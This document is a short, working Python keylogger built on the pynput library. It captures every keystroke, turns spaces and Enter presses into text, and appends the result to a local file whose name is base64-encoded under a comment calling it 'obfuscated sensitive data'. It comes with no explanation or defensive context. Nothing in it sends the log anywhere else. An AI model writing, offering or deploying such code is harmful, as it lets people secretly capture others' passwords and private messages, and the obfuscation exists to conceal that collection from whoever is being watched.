from pynput.keyboard import Key, Listener
import base64

# Obfuscated sensitive data
file_name_encoded = b'a2V5X2xvZy50eHQ='  # Base64-encoded "key_log.txt"
file_name = base64.b64decode(file_name_encoded).decode()

keys = []

def on_press(key):
    keys.append(key)
    write_file()

def write_file():
    with open(file_name, "a") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                file.write(" ")
            elif k == "Key.enter":
                file.write("\n")
            elif not k.startswith("Key."):
                file.write(k)
        keys.clear()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
